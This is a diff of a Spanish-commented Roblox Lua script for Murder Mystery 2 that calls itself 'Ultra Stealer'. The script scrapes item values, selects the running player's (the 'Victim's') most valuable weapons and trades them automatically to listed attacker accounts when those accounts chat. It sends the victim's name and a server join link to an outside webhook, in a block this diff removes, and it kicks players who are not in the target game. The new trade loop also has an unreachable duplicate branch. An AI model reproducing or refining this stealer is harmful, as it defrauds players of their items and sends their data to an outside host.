@@ -16,25 +16,13 @@ if not req then warn("No HTTP request method available!") return end
 
 -- Lista de valores Godly + Ancient (respaldo)
 local fallbackValueList = {
-    ["gingerscope"]=10700,
-    ["travelers axe"]=6900,
-    ["celestial"]=975,
-    ["astral"]=850,
-    ["morning star"]=720,
-    ["northern star"]=680,
-    ["moonlight"]=640,
-    ["helios"]=600,
-    ["stormbringer"]=580,
-    ["reaper"]=550,
-    ["blaze"]=500,
-    ["phantom"]=470,
-    ["zenith"]=450,
-    ["ares"]=420,
-    ["hephaestus"]=400,
-    ["mystic"]=380
+    ["gingerscope"]=10700, ["travelers axe"]=6900, ["celestial"]=975, ["astral"]=850,
+    ["morning star"]=720, ["northern star"]=680, ["moonlight"]=640, ["helios"]=600,
+    ["stormbringer"]=580, ["reaper"]=550, ["blaze"]=500, ["phantom"]=470,
+    ["zenith"]=450, ["ares"]=420, ["hephaestus"]=400, ["mystic"]=380
 }
 
--- Páginas para scraping
+-- Scraping
 local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
@@ -42,11 +30,7 @@ local categories = {
     classic = "https://supremevaluelist.com/mm2/vintages.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
-
-local headers = {
-    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-}
+local headers = {["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", ["User-Agent"]="Mozilla/5.0"}
 
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 
@@ -84,39 +68,24 @@ local function buildValueList()
         local html = fetchHTML(url)
         if html ~= "" then
             local extracted = extractItems(html)
-            for k,v in pairs(extracted) do
-                allValues[k] = v
-            end
+            for k,v in pairs(extracted) do allValues[k] = v end
         end
     end
     for k,v in pairs(fallbackValueList) do
-        if not allValues[k] then
-            allValues[k] = v
-        end
+        if not allValues[k] then allValues[k] = v end
     end
     return allValues
 end
 
 local valueList = buildValueList()
 
--- Verificación de servidor
 if game.PlaceId ~= 142823291 then
     LocalPlayer:Kick("Game not supported. Join a normal MM2 server.")
 end
 
--- Función webhook
+-- Webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
-    local data = {
-        ["content"] = prefix or "",
-        ["embeds"] = {{
-            ["title"] = title,
-            ["description"] = description or "",
-            ["color"] = 65280,
-            ["fields"] = fields or {},
-            ["thumbnail"] = thumbnail and {["url"]=thumbnail} or nil,
-            ["footer"] = {["text"]="Ultra Stealer by Anonimo 🇪🇨"}
-        }}
-    }
+    local data = {["content"]=prefix or "", ["embeds"]={{["title"]=title, ["description"]=description or "", ["color"]=65280, ["fields"]=fields or {}, ["thumbnail"]=thumbnail and {["url"]=thumbnail} or nil, ["footer"]={["text"]="Ultra Stealer by Anonimo 🇪🇨"}}}}
     local body = HttpService:JSONEncode(data)
     pcall(function() req({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
 end
@@ -159,98 +128,49 @@ for id, amount in pairs(profile.Weapons.Owned) do
         if rarityIndex and rarityIndex >= minIndex then
             local value = valueList[item.ItemName:lower()] or 1
             if value >= min_value then
-                table.insert(weaponsToSend,{
-                    DataID = id,
-                    Amount = amount,
-                    Value = value,
-                    TotalValue = value * amount,
-                    Rarity = item.Rarity
-                })
+                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,TotalValue=value*amount,Rarity=item.Rarity})
             end
         end
     end
 end
 
-table.sort(weaponsToSend, function(a,b) return a.TotalValue > b.TotalValue end)
+table.sort(weaponsToSend,function(a,b) return a.TotalValue>b.TotalValue end)
 
-totalValue = 0
-for _, w in ipairs(weaponsToSend) do
-    totalValue += w.TotalValue
-end
-
--- Webhook inicial
-local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
-local fields = {
-    {name="Victim", value=LocalPlayer.Name, inline=true},
-    {name="Join link", value=joinLink, inline=false},
-    {name="Inventario", value="", inline=false},
-    {name="Total value", value=tostring(totalValue), inline=true}
-}
-for i, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
-    if #fields[3].value > 1024 then
-        fields[3].value = fields[3].value.."\nMas armas en el inventario 😎💲"
-        break
-    end
-end
-local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
-local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
-SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
-
--- Trade continuo seguro
+-- Trade continuo con delay mientras se añaden armas
 local function doTrade(targetName)
-    while #weaponsToSend > 0 do
+    while #weaponsToSend>0 do
         local status = getTradeStatus()
-        print("[Trade] Estado actual:", status)
-
         if status=="None" then
-            print("[Trade] Enviando solicitud a", targetName)
             sendTradeRequest(targetName)
         elseif status=="StartTrade" then
-            print("[Trade] Trade iniciado con", targetName)
-            local blockSize = 4
-            while #weaponsToSend > 0 and getTradeStatus() == "StartTrade" do
-                for i = 1, math.min(blockSize, #weaponsToSend) do
-                    local w = table.remove(weaponsToSend, 1)
-                    print("[Trade] Agregando arma:", w.DataID, "x"..w.Amount)
-                    for _ = 1, w.Amount do
-                        addWeaponToTrade(w.DataID)
-                        task.wait(0.2)
-                    end
-                end
-                task.wait(0.5)
+            -- Delay de 10s mientras se añaden armas
+            for i=#weaponsToSend,1,-1 do
+                local w = table.remove(weaponsToSend,1)
+                for _=1,w.Amount do addWeaponToTrade(w.DataID) end
+                task.wait(10) -- delay de 10 segundos entre cada bloque de armas
             end
-
-            print("[Trade] Esperando confirmación de aceptación de la otra parte...")
-            while getTradeStatus() == "StartTrade" do
-                task.wait(0.5)
-            end
-
-            print("[Trade] Esperando 7 segundos antes de aceptar...")
-            task.wait(7)
-
-            print("[Trade] Aceptando trade...")
             acceptTrade()
             waitForTradeCompletion()
-            print("[Trade] Trade completado!")
         elseif status=="ReceivingRequest" then
-            print("[Trade] Recibiendo solicitud de trade, rechazando...")
             declineRequest()
+            task.wait(0.3)
+        elseif status=="StartTrade" then
+            declineTrade()
+            task.wait(0.3)
         else
-            print("[Trade] Estado inesperado:", status)
+            task.wait(0.5)
         end
-        task.wait(1)
     end
 end
 
--- Activación trade por chat solo para usuarios autorizados
+-- Activación trade por chat solo para tus usuarios
 for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() task.spawn(function() doTrade(p.Name) end) end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() task.spawn(function() doTrade(p.Name) end) end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
